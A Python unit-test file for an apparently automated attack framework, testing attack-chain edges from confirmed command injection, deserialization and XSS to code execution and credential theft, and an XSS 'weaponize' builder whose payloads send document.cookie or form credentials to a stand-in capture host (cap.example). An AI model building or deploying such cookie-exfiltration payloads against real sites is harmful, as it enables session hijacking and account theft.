"""Tests: XSS weaponization + the attack-chain edges that closed the
cmdi/deser/xss orphan findings.

The hunt engine confirms a runnable web bug; the payoff paths must exist:

* a confirmed command injection / deserialization reaches `rce`;
* a confirmed reflected XSS reaches the session-theft asset
  (`xss_weaponize` -> `xss_exfil`), whose payload ships document.cookie.
"""
import unittest

from phantom.automation.attack_chain import AttackGraph
from phantom.automation.belief import WorldModel
from phantom.automation.exploit.xss import xss_exfil_payload, xss_poc_url
from phantom.automation.guidance.commands import make_registry
from phantom.automation.guidance.kit import (
    _pick_xss_candidate, _xss_weaponize_adapter, _xss_weaponize_interp)

TARGET = "10.0.0.5"


def _wm_with_anomaly(cls, confirmed=True, endpoint="/?q=1", score=2.5):
    wm = WorldModel(target=TARGET, target_type="ip")
    wm.add_finding("service", "tcp/80",
                   {"port": "80", "service": "http"})
    wm.add_finding("hunt_anomaly", f"{cls}:80:probe",
                   {"cls": cls, "confirmed": confirmed, "score": score,
                    "endpoint": endpoint, "port": "80"})
    return wm


class TestAttackChainEdges(unittest.TestCase):

    def _has_edge(self, wm, from_kind, to_kind):
        g = AttackGraph(wm)
        g.build()
        src = {n.id for n in g.nodes.values() if n.kind == from_kind}
        dst = {n.id for n in g.nodes.values() if n.kind == to_kind}
        return any(e.from_id in src and e.to_id in dst for e in g.edges)

    def test_confirmed_cmdi_reaches_rce(self):
        wm = _wm_with_anomaly("cmdi")
        wm.add_finding("rce", "foothold", {"x": 1})
        self.assertTrue(self._has_edge(wm, "hunt_anomaly", "rce"))

    def test_confirmed_deser_reaches_rce(self):
        wm = _wm_with_anomaly("deser")
        wm.add_finding("rce", "foothold", {"x": 1})
        self.assertTrue(self._has_edge(wm, "hunt_anomaly", "rce"))

    def test_confirmed_xss_reaches_creds(self):
        wm = _wm_with_anomaly("xss")
        wm.add_finding("creds", "session", {"username": "v"})
        self.assertTrue(self._has_edge(wm, "hunt_anomaly", "creds"))

    def test_unconfirmed_cmdi_has_no_edge(self):
        wm = _wm_with_anomaly("cmdi", confirmed=False)
        wm.add_finding("rce", "foothold", {"x": 1})
        self.assertFalse(self._has_edge(wm, "hunt_anomaly", "rce"))


class TestXssPayloadBuilder(unittest.TestCase):

    def test_cookie_payload_is_fire_and_forget(self):
        p = xss_exfil_payload("https://cap.example/c/ab")
        self.assertIn("new Image()", p)
        self.assertIn("document.cookie", p)
        self.assertIn("https://cap.example/c/ab?c=", p)

    def test_creds_payload_posts_fields(self):
        p = xss_exfil_payload("https://cap.example/c/ab", steal="creds")
        self.assertIn("fetch(", p)
        self.assertIn("document.cookie", p)

    def test_missing_url_is_refused(self):
        with self.assertRaises(ValueError):
            xss_exfil_payload("")

    def test_poc_url_replaces_the_first_param(self):
        poc = xss_poc_url("/search?q=1&page=2", "<script>x</script>")
        self.assertIn("/search?q=", poc)
        self.assertIn("&page=2", poc)
        self.assertNotIn("q=1&", poc)

    def test_poc_url_without_param_is_empty(self):
        self.assertEqual(xss_poc_url("/noparam", "<script>x</script>"), "")


class TestXssWeaponizeCapability(unittest.TestCase):

    def setUp(self):
        self.reg = make_registry()

    def test_registered_with_the_right_contract(self):
        cap = self.reg.get("xss_weaponize")
        self.assertIsNotNone(cap)
        self.assertEqual(cap.category, "exploit")
        self.assertEqual(cap.effects, ["xss_exfil"])

    def test_precondition_requires_a_confirmed_xss(self):
        cap = self.reg.get("xss_weaponize")
        confirmed = _wm_with_anomaly("xss", confirmed=True)
        unconfirmed = _wm_with_anomaly("xss", confirmed=False)
        assert cap.preconditions
        self.assertTrue(all(p(confirmed) for p in cap.preconditions))
        self.assertFalse(all(p(unconfirmed) for p in cap.preconditions))

    def test_candidate_selection_ignores_unconfirmed(self):
        self.assertIsNone(_pick_xss_candidate(_wm_with_anomaly(
            "xss", confirmed=False)))

    def test_adapter_builds_payload_and_poc(self):
        wm = _wm_with_anomaly("xss", endpoint="/search?q=1")
        out = _xss_weaponize_adapter(wm, {"exfil_url": "https://cap.example/c/z"})
        self.assertIn("XSS_EXFIL:steal=cookie", out)
        self.assertIn("XSS_PAYLOAD:", out)
        self.assertIn("document.cookie", out)
        self.assertIn("/search?q=", out)

    def test_adapter_refuses_without_exfil_url(self):
        wm = _wm_with_anomaly("xss")
        with self.assertRaises(ValueError):
            _xss_weaponize_adapter(wm, {})

    def test_interpreter_emits_xss_exfil_finding(self):
        wm = _wm_with_anomaly("xss", endpoint="/search?q=1")
        out = _xss_weaponize_adapter(wm, {"exfil_url": "https://cap.example/c/z"})
        findings = _xss_weaponize_interp(out, wm, {})
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0].kind, "xss_exfil")
        self.assertIn("document.cookie", findings[0].value["payload"])
        self.assertTrue(findings[0].value["poc_url"].startswith("/search?q="))


if __name__ == "__main__":
    unittest.main()
